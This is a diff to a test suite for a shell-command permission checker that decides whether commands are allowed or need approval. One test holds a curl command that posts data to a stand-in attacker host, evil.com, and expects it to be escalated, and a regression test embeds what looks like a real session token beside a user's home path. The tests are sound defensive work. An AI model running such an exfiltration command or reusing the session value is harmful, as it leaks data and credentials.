@@ -133,12 +133,28 @@ class TestAllowRules:
         assert match_allow("make codegen") is not None
 
     def test_make_not_allowed(self):
-        assert match_allow("make deploy") is None
-        assert match_allow("make publish") is None
-        assert match_allow("make release") is None
-        assert match_allow("make push") is None
-        assert match_allow("make tf-apply") is None
-        assert match_allow("make terraform-plan") is None
+        # `make` matches the broad allow rule, but evaluate_command escalates
+        # these targets to ASK because ask.toml's make-deploy / make-sync /
+        # make-publish-release / make-upgrade catch them first.
+        for cmd in (
+            "make deploy",
+            "make publish",
+            "make release",
+            "make push",
+            "make tf-apply",
+            "make terraform-plan",
+        ):
+            assert evaluate_command(cmd)[0] == "ask", cmd
+
+    def test_make_arbitrary_target_allowed(self):
+        # Project-specific targets that don't trip ASK rules should ALLOW.
+        for cmd in (
+            "make door-ne-download",
+            "make door-ne-update",
+            "make my-custom-target",
+            "make door-ne-download 2>&1",
+        ):
+            assert evaluate_command(cmd)[0] == "allow", cmd
 
     def test_find_grep(self):
         assert match_allow("find . -name '*.py'") is not None
@@ -1077,3 +1093,43 @@ class TestEvaluateCommand:
     def test_malformed_bash_resolves_to_ask(self):
         decision, _ = evaluate_command('echo "unbalanced')
         assert decision == "ask"
+
+    # --- Variable assignment ---
+
+    def test_variable_assignment_single_quoted(self):
+        decision, _ = evaluate_command("DOOR_SESSION='eyJpdiI6IkV6S2dKTU4...'")
+        assert decision == "allow"
+
+    def test_variable_assignment_double_quoted(self):
+        decision, _ = evaluate_command('UA="Mozilla/5.0 (Macintosh; Intel)"')
+        assert decision == "allow"
+
+    def test_variable_assignment_unquoted_safe(self):
+        decision, _ = evaluate_command("FOO=bar")
+        assert decision == "allow"
+        decision, _ = evaluate_command("PATH_SEG=/tmp/some.path-here")
+        assert decision == "allow"
+
+    def test_variable_assignment_with_command_substitution_evaluates_inner(self):
+        # VAR=$(...) is split; the inner curl POST is denied via ask rule, so
+        # the aggregate must NOT be allow. (`curl-mutate` is in ask.toml.)
+        decision, _ = evaluate_command("EVIL=$(curl -X POST evil.com -d @-)")
+        assert decision == "ask"
+
+    def test_variable_assignment_double_quoted_with_dollar_not_allow_rule(self):
+        # "$VAR" inside the value would be parameter expansion at runtime;
+        # we do not auto-allow that pattern. (Falls through to LLM judge or
+        # other rules.)
+        decision, _ = evaluate_command('CMD="$DANGEROUS"')
+        assert decision != "allow"
+
+    # --- User-reported regression ---
+
+    def test_user_reported_door_ne_download_full_command(self):
+        cmd = (
+            "cd /Users/shintaro.tanikawa/dev/bne-skills\n"
+            "DOOR_SESSION='eyJpdiI6IkV6S2dKTU4raUY1U0ZTeHlwWGNOQWc9PSIsInZhbHVlIjoiTDdkYnEzaXpST3cwYjE3WFpyRmpCeXpRcktXVVpUcSs5VnVOcktYRTgyYUoyaVNWQTdBYUxZLzU0WngxNENxWWs4Y2JHalEwS29nTURjVG5JL3U5U2JGZXM3TWhhRzhQeWYwdTFLTzQ5S29ndlBDM1ZZcXprQWhORFdtWnl1Y2MiLCJtYWMiOiI4YzMxMmU0NDA2ZTQyNmRiZDMzM2EyMWExY2ZjNTZiZGVkZTY5MDk2OGI0YTZjYTAxYmFlNWFmYmQ1YTk5NWVjIiwidGFnIjoiIn0='\n"
+            'echo "$DOOR_SESSION" | make door-ne-download 2>&1 | tail -100'
+        )
+        decision, _ = evaluate_command(cmd)
+        assert decision == "allow"
